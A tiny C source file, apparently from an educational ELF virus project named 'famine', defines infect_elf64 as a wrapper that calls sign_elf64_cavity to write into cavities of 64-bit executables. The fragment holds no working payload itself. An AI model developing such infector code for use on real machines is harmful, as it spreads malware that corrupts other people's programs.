#include "famine.h"

int infect_elf64(t_file *file, t_elf64 *elf64)
{
	return (sign_elf64_cavity(file, elf64));
}
